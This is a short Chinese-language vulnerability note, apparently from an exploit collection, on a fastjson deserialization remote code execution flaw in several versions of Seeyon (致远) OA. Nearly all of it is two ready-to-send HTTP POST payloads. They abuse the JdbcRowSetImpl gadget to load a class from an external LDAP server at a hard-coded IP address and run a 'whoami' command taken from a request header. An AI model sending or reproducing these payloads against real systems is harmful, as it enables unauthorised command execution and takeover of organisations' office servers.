## 漏洞概述

部分版本使用了有漏洞的fastjson组件，导致远程代码执行漏洞

## 影响范围

```http
致远 OA V7.1、V7.1SP1
致远 OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3
致远 OA V6.1、V6.1SP1、V6.1SP2
致远 V6.0及V6.0SP1
致远 V5.6及V5.6SP1
```

## POC&EXP

```http
POST /seeyon/sursenServlet  HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
cmd:whoami

sursenData={"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://119.45.153.41:1389/TomcatBypass/TomcatEcho","autoCommit":"true"}}

```

```http
POST /seeyon/main.do?method=changeLocale  HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
cmd:whoami

_json_params={"v24":
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://119.45.153.41:1389/TomcatBypass/TomcatEcho","autoCommit":true}}
```

